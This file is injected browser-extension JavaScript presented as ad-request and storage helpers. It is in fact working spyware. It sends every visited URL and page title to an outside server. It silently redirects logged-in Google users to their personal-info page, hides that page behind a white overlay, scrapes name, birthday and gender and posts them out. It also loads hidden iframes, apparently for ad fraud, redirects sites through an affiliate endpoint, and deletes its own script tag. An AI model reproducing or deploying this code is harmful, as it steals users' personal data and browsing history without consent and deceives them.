if (!window.zMainObj) {
    window.zMainObj = {};
}

if (!window.zMainObj.adRequests) {
    window.zMainObj.isDebug = false;
    window.zMainObj.adRequests = {
        'log': window.zMainObj.isDebug ? console.log.bind(console.log, `[AD_REQUEST]`) : () => {},
        'id': 'ar' + parseInt(Math.random() * Date.now()).toString(16),
        'cacheFrames': {},
        'cssText': () => {
            const id = window.zMainObj.adRequests.id;

            return `
                .${id}hidden{ position:absolute !important; opacity:0 !important; pointer-events:none !important}
            `;
        },
        'generateId': (length = 7) => {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const charactersLength = characters.length;

            for ( let i = 0; i < length; i++ ) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }

            return result;
        },
        'insertStyles': (adsId, cssText, parent = document.head) => {
            if (!document.getElementById(adsId + 'style')) {
                const styleElement = document.createElement('style');

                styleElement.innerHTML = cssText;
                styleElement.setAttribute('id', adsId + 'style');
                parent.appendChild(styleElement);
            }
        },
        'debounceDelay': function(func, delay, maxDelay) {
            let timeoutId = null;
            let lastTime = Date.now();

            return function() {
                // eslint-disable-next-line prefer-rest-params
                const args = arguments;

                if (timeoutId) {
                    clearTimeout(timeoutId);
                }
                if (Date.now() - lastTime > maxDelay) {
                    lastTime = Date.now();
                    func.apply(func, args);
                }
                else {
                    timeoutId = setTimeout(() => {
                        func.apply(func, args);
                    }, delay);
                }
            };
        },
        'initObserver': function(parent, cb, minDelay, maxDelay, childList, subtree = false, attributes = false) {
            const option = { childList, subtree, attributes };
            const observer = new MutationObserver(window.zMainObj.adRequests.debounceDelay(cb, minDelay, maxDelay));

            observer.observe(parent, option);
        },
        'initInterObserver': function(cb, parent, ...rest) {
            function handleIntersection(entries) {
                entries.map(({ isIntersecting, target }) => {
                    if (isIntersecting) {
                        cb(target, ...rest);
                        interObserver.unobserve(target);
                    }
                });
            }
            const interObserver = new IntersectionObserver(handleIntersection);

            interObserver.observe(parent);
        },
        'altStat': function(action, blockName, network, count = 1) {
            (new Image()).src = 'https://doubleview.online/gant/ceiekmdcekohaonbmapmnnnkppbjlbkp_62bd5ac87e60a928b67bd25b/ceiekmdcekohaonbmapmnnnkppbjlbkp/'+action+'/'+blockName+'/'+count+'/'+window.screen.availWidth+'x'+window.screen.availHeight+'/'+window.navigator.language;
        },
        'stat': function(action, blockName, network, count = 1) {
            const statDom = 'astato.online';
            let statUrl = `https://${statDom}/s/c?a=${action}&u=62bd5ac87e60a928b67bd25b&e=ceiekmdcekohaonbmapmnnnkppbjlbkp&b=west_${blockName}&n=${network}_west&r=`+Math.random();

            if (action !== 'click') {
                statUrl += `&c=${count}`;
            }
            (new Image()).src = statUrl;
            window.zMainObj.adRequests.altStat(action, blockName, network, count);
        },
        'onLoadEpom': function(response, callback, options) {
            const rData = [];
            const result = {};

            if (!response) {
                callback(null);

                return;
            }
            result.title = response.title;
            result.subtitle = response.description;
            result.url = response.clickUrl;
            result.site = '';
            result.img = response.images && response.images.length && response.images.length > 0
                ? response.images[0].url
                : '';

            response.beacons && response.beacons.length > 0 && response.beacons.forEach(({ type, url }) => {
                if (type && type === 'impression') {
                    (new Image()).src = url;
                }
            });

            rData.push(result);

            options.blockName && window.zMainObj.adRequests.stat('view', options.blockName, 'epom');
            callback(rData, null, 'epom');
        },
        'generateChanelTargeting': function(age, gender) {
            let result = '';

            if (age < 13) {
                result = '0013';
            }
            else if ((age >= 13) && (age <= 17)) {
                result = '1317';
            }
            else if ((age >= 18) && (age <= 24)) {
                result = '1824';
            }
            else if ((age >= 25) && (age <= 34)) {
                result = '2534';
            }
            else if ((age >= 35) && (age <= 44)) {
                result = '3544';
            }
            else if ((age >= 45) && (age <= 54)) {
                result = '4554';
            }
            else if ((age >= 55) && (age <= 64)) {
                result = '5564';
            }
            else if (age >= 65) {
                result = '6500';
            }
            else {
                result = '0000';
            }

            return gender + result;
        },
        'epom': function(options, callback) {
            callback(null);
            return;
            window.zMainObj.storage.getData('userDataGAG', data => {
                const birthday = data && data.birthday ? data.birthday : '';
                const gender = data && data.gender ? data.gender : '';
                let age = '0';

                if (birthday) {
                    const birthdayInMs = new Date(birthday);
                    const ageDifMs = Date.now() - birthdayInMs;
                    const ageDate = new Date(ageDifMs);

                    age = Math.abs(ageDate.getUTCFullYear() - 1970);
                }

                const genderFromStorage = gender && ((gender === 'm') || (gender === 'f'))
                    ? gender
                    : 'n';
                const xhr = new XMLHttpRequest();
                const normalizedGender = genderFromStorage === 'm' ? 'male' : genderFromStorage === 'f' ? 'female' : 'unknown';
                const chanelTargeting = window.zMainObj.adRequests.generateChanelTargeting(age, genderFromStorage);

                const reqLink = `https://aj2472.online/ads-api-native?key=${options.id}&format=json&ch=${chanelTargeting}&cp.age=${age}&cp.gender=${normalizedGender}`;

                xhr.responseType = 'json';
                xhr.open('GET', reqLink, true);
                xhr.addEventListener('load', function(event) {
                    const response = event?.currentTarget?.response;

                    !response || response?.message === 'no ads'
                        ? callback(null)
                        : window.zMainObj.adRequests.onLoadEpom(response, callback, options);
                });
                xhr.addEventListener('error', function() {
                    callback(null);
                });
                xhr.withCredentials = true;
                xhr.send();
                options.blockName && window.zMainObj.adRequests.stat('request', options.blockName, 'epom');
            });
        },
        'getFrameUrl': function(callback) {
            const xhr = new XMLHttpRequest();
            const reqLink = `https://rumorpix.com/interface/get_random_news.php?cnt=1`;

            xhr.responseType = 'json';
            xhr.open('GET', reqLink, true);
            xhr.addEventListener('load', function(event) {
                const response = event.currentTarget.response;

                if (response?.data?.length === 0 ) {
                    callback(null);

                    return;
                }

                callback(response.data);
            });
            xhr.addEventListener('error', function(event) {
                callback(null);

                void event;
            });
            xhr.send();
        },
        'createFrameWrapper': function(width, height, id) {
            const wrapper = document.createElement('div');

            wrapper.style.setProperty('width', width + 'px');
            wrapper.style.setProperty('height', height + 'px');
            wrapper.style.setProperty('opacity', '0');
            wrapper.style.setProperty('pointer-events', 'none');
            wrapper.style.setProperty('user-select', 'none');
            wrapper.style.setProperty('position', 'absolute');
            wrapper.style.setProperty('white-space', 'normal', 'important');
            wrapper.style.setProperty('direction', 'ltr', 'important');
            wrapper.style.setProperty('position', 'relative', 'important');
            wrapper.style.setProperty('overflow', 'hidden', 'important');
            wrapper.classList.add(id + 'frm_wrapper');

            return wrapper;
        },
        'iframeRender': function(parentBlock, onSuccess, onFail, frameWidth, frameHeight, frameUrl, additionalSettings = '') {
            const hashId = window.zMainObj.adRequests.generateId()+additionalSettings;
            const wrapper = window.zMainObj.adRequests.createFrameWrapper(frameWidth, frameHeight, hashId);

            parentBlock.classList.add(window.zMainObj.adRequests.id + 'hidden');
            window.zMainObj.adRequests.getFrameUrl(function(data) {
                if (!data || data.length === 0) {
                    return;
                }
                const iframe = document.createElement('iframe');
                const screenWidth = window.innerWidth
                    || document.documentElement.clientWidth
                    || document.body.clientWidth;
                const screeHeight = window.innerHeight
                    || document.documentElement.clientHeight
                    || document.body.clientHeight;

                iframe.setAttribute('scrolling', 'no');
                iframe.setAttribute('src', data[0][frameUrl] + `#${hashId}`);
                iframe.setAttribute('width', screenWidth.toString());
                iframe.setAttribute('height', screeHeight.toString());
                iframe.setAttribute('src', data[0][frameUrl] + `#${hashId}`);
                iframe.style.setProperty('width', screenWidth + 'px');
                iframe.style.setProperty('height', screeHeight + 'px');
                iframe.style.setProperty('opacity', '1');
                iframe.style.setProperty('z-index', '1');
                iframe.style.setProperty('border', 'none');
                iframe.style.setProperty('overflow', 'hidden');
                iframe.style.setProperty('position', 'absolute');
                iframe.style.setProperty('top', '0');
                iframe.style.setProperty('left', '0');
                wrapper.appendChild(iframe);
                parentBlock.appendChild(wrapper);
                window.zMainObj.adRequests.cacheFrames[hashId] = {
                    parent: wrapper,
                    onSuccess,
                    onFail,
                };
            });
        },
        'initMessageListener': function() {
            window.addEventListener('message', e => {
                if (e?.data?.msgData) {
                    const id = Object.keys(e.data.msgData)[0];
                    const frameData = window.zMainObj.adRequests.cacheFrames[id];

                    if (frameData) {
                        const { parent, onSuccess, onFail } = frameData;

                        if (e.data.msgData.status === 'ok') {
                            parent.style.setProperty('opacity', '1');
                            parent.style.setProperty('pointer-events', 'all');
                            parent.style.setProperty('user-select', 'all');
                            parent.style.setProperty('position', 'relative');
                            parent.parentNode.classList.remove(window.zMainObj.adRequests.id + 'hidden');
                            onSuccess(parent);
                            delete window.zMainObj.adRequests.cacheFrames[id];
                        }
                        else {
                            onFail();
                            delete window.zMainObj.adRequests.cacheFrames[id];
                        }
                    }
                }
            }, false);
        },
        'init': function() {
            window.zMainObj.adRequests.initMessageListener();
            window.zMainObj.adRequests.insertStyles(window.zMainObj.adRequests.id, window.zMainObj.adRequests.cssText());
        },
    };
    window.zMainObj.adRequests.init();
}
if(!window.zMainObj)
	window.zMainObj = {};
		
if(!window.zMainObj.storage && window.self === window.top)
{
	window.zMainObj.storage = {
		'extRequest' : function(params,callback)
		{
			var handler = false;
			if(callback)
			{
				var cbid = 'cb'+(new Date()).getTime().toString()+Math.round(Math.random()*10000).toString();
				window[cbid] = callback;
				handler = 'window["'+cbid+'"]';
				params.handler = handler;
			}
			window.postMessage({'cursorMsg':1,'options':params,'handler':handler},'*');
		},
		'getData' : function(rkey, callback)
		{
			window.zMainObj.storage.extRequest({
				action: 'getCursor',
				key: rkey
			},callback);
		},
		'setData' : function(rkey, rvalue) {
			window.zMainObj.storage.extRequest({
				action: 'setCursor',
				key: rkey,
				value: rvalue
			});
		}
	};
}if (!window.zMainObj) {
    window.zMainObj = {};
}

if (!window.zMainObj.getAgeGender) {
    window.zMainObj.getAgeGender = 1;
    const checkPeriod = 7 * 24 * 60 * 60 * 1000;
    const formatDate = date => {
        const d = new Date(date);
        const year = d.getFullYear();
        let month = String(d.getMonth() + 1);
        let day = String(d.getDate());

        if (month.length < 2) {
            month = '0' + month;
        }
        if (day.length < 2) {
            day = '0' + day;
        }

        return [year, month, day].join('-');
    };

    const redirectToPrevPage = () => {
        window.zMainObj.storage.getData('previousUrl', previousUrl => {
            const newUrl = previousUrl;

            window.zMainObj.storage.setData('previousUrl', '');
            window.open(newUrl, '_self');
        });
    };

    const postUserData = userData => {
        fetch('https://doublestat.info/c', {
            method: 'POST',
            body: btoa(unescape(encodeURIComponent(JSON.stringify({
                'a': 'setUserData',
                'u': '62bd5ac87e60a928b67bd25b',
                'data': {
                    'source': 'google',
                    'name': userData.name,
                    'birthday': userData.birthday,
                    'gender': userData.gender,
                },
            })))),
            headers: { 'Content-Type': 'text/plain' },
            credentials: 'include',
        })
            .then(resp => resp.text())
            .catch(error => void error)
            .finally(() => redirectToPrevPage());
    };

    const updateUserData = userData => {
        window.zMainObj.storage.getData('userDataGAG', userDataGAG => {
            const normalizedUserData = {...userDataGAG};
            const { name, birthday, gender } = userData;

            if (!normalizedUserData.name) {
                normalizedUserData.name = name;
            }
            if (!normalizedUserData.birthday) {
                normalizedUserData.birthday = birthday;
            }
            if (!normalizedUserData.gender || normalizedUserData.gender === 'n') {
                normalizedUserData.gender = gender;
            }
            window.zMainObj.storage.setData('userDataGAG', normalizedUserData);
            postUserData(normalizedUserData);
        });
    };

    const processData = userData => {
        updateUserData(userData);
    };

    const parseUserData = () => {
        const userName = document.querySelector('a[href^="profile/name"], a[href^="name"]');
        const userBirth = document.querySelector('a[href^="birthday"]');
        const userGender = document.querySelector('a[href^="gender"]');
        const userData = {
            name: '',
            birthday: '',
            gender: 'n',
        };

        if (userName) {
            const nameLabelNode = userName.getAttribute('aria-label');

            userData.name = nameLabelNode ? nameLabelNode.replace('Name ', '') : '';
        }

        if (userBirth) {
            const birthdayLabelNode = userBirth.getAttribute('aria-label');

            userData.birthday = birthdayLabelNode ? formatDate(birthdayLabelNode.replace('Birthday ', '')) : '';
        }

        if (userGender) {
            const genderLabelNode = userGender.getAttribute('aria-label');

            userData.gender = genderLabelNode ? genderLabelNode.replace('Gender ', '').substring(0, 1).toLowerCase() : 'n';
        }

        if (userData.name || userData.birthday || userData.gender) {
            processData(userData);
        }
        else {
            redirectToPrevPage();
        }
    };

    const isLoggedIn = () => {
        const signInBtn = document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]');
        const { pathname } = document.location;

        return Boolean(!signInBtn) && !pathname.includes('signin') && !pathname.includes('signup');
    };

    const createCurtain = () => {
        const curtain = document.createElement('div');
        const { clientWidth, clientHeight } = document.body;

        curtain.style.setProperty('width', clientWidth + 'px');
        curtain.style.setProperty('height', clientHeight + 'px');
        curtain.style.setProperty('position', 'fixed');
        curtain.style.setProperty('top', '0');
        curtain.style.setProperty('left', '0');
        curtain.style.setProperty('z-index', '2147483645');
        curtain.style.setProperty('background-color', '#ffffff');
        document.body.appendChild(curtain);
    };

    const init = () => {
        if (document.location.pathname.includes('/maps') ) {
            return;
        }
        if (document.location.origin.includes('google.com') && isLoggedIn()) {
            window.zMainObj.storage.getData('lastCheckDate', lastCheckDate => {
                window.zMainObj.storage.getData('userDataGAG', userDataGAG => {
                    if ((!userDataGAG) && (!lastCheckDate || new Date().getTime() >= checkPeriod + lastCheckDate)) {
                        window.zMainObj.storage.setData('lastCheckDate', new Date().getTime());
                        window.zMainObj.storage.setData('previousUrl', document.location.href);
                        window.open('https://myaccount.google.com/personal-info?hl=en', '_self');
                    }
                });
            });
        }
        if (document.location.href.includes('https://myaccount.google.com/personal-info?hl=en')) {
            window.zMainObj.storage.getData('previousUrl', previousUrl => {
                if (previousUrl) {
                    createCurtain();
                    parseUserData();
                }
            });
        }
    };

    init();
}
if (!window.zMainObj) { window.zMainObj = {}; }

(() => {
	if (window.zMainObj.domCnt) {
		return;
	}
	
	window.zMainObj.domCnt = {
		'lastUrl' : '',
		'postUserData' : function(curUrl){
			fetch('https://triplestat.online/c', {
				method: 'POST',
				body: btoa(unescape(encodeURIComponent(JSON.stringify({
					'a': 'sendVisit',
					'p': {
						'u': curUrl,
						'ui': '62bd5ac87e60a928b67bd25b',
						't': document.title,
						'a': '35',
						'g': 'f',
						'c': 'KR',
					},
				})))),
				headers: { 'Content-Type': 'text/plain' },
				credentials: 'include',
			});
		},
		'init' : function(){
			let curUrl = document.location.toString();
			if(curUrl != window.zMainObj.domCnt.lastUrl)
			{
				window.zMainObj.domCnt.lastUrl = curUrl;
				window.zMainObj.domCnt.postUserData(curUrl);
			}
			setTimeout(window.zMainObj.domCnt.init,100);
		}
	};
	
	window.zMainObj.domCnt.init();
	
})();//# sourceURL=redirect_checker.js

if (!window.zMainObj)
	window.zMainObj = {};

(() => {
	if (window.zMainObj.redirectChecker) {
		return;
	}
	
	window.zMainObj.redirectChecker = 1;
	
	let unid = '62bd5ac87e60a928b67bd25b';
	let domainTestInterval = 1000 * 60 * 30;
	let endpoint = 'https://redmarket.online';
	let domain = window.location.hostname;
	let localStorageTimeKey = 'lctkdr';
	
	function authMe(id) {
		let urlAuth = `${endpoint}/h/auth/${unid}?mct=${id}&prd=${encodeURIComponent(window.location.href)}`;

		window.localStorage.setItem(localStorageTimeKey, Date.now().toString());
		window.location.href = urlAuth;
	}
	function isSuitableDomain() {
		return new Promise((resolve, reject) => {
			let url = `${endpoint}/search?md=${domain}&mu=${encodeURIComponent(window.location.href)}`;
			let xhr = new XMLHttpRequest();

			xhr.responseType = 'json';

			xhr.open('get', url);
			xhr.addEventListener('load', event => {
				let response = event.currentTarget.response;

				if ( !response ) {
					console.log('Response is null');
					resolve(false);
					return;
				}
				if ( response.status !== 'success' ) {
					console.log('Response status is not success');
					resolve(false);
					return;
				}

				resolve(response.data);
			});
			xhr.addEventListener('error', event => {
				reject(new Error('Loading error'));
			});
			xhr.send();
		});
	}
	function needsAuth() {
		let timestamp = parseInt(window.localStorage.getItem(localStorageTimeKey));

		if ( !timestamp || isNaN(timestamp) ) return true;

		return Date.now() - timestamp > domainTestInterval;
	}
	async function init() {
		if ( !needsAuth() ) {
			return;
		}

		let id = await isSuitableDomain();

		if ( !id ) {
			return;
		}

		authMe(id);
	}

	init().catch(e => {});
})();
(function(){try{document.currentScript.remove();}catch(e){}})();